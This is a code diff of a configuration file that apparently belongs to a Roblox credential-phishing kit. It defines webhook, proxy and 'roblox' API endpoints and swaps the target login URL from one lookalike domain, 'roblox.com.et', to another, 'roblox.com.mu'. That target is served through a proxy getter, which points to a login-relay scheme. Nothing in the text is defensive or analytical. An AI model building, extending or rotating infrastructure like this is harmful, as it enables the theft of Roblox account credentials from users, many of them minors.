@@ -6,7 +6,7 @@ export const CONFIG = {
   API_WEBHOOK_ENDPOINT: "/api/webhook",
   API_ROBLOX_ENDPOINT: "/api/roblox",
   API_PROXY_ENDPOINT: "/api/proxy",
-  TARGET_URL: "https://www.roblox.com.et/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F919588160482%2Fprofile",
+  TARGET_URL: "https://www.roblox.com.mu/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F2654745831%2Fprofile",
   get PROXIED_TARGET_URL() {
     return `/api/proxy?url=${encodeURIComponent(this.TARGET_URL)}`;
   },
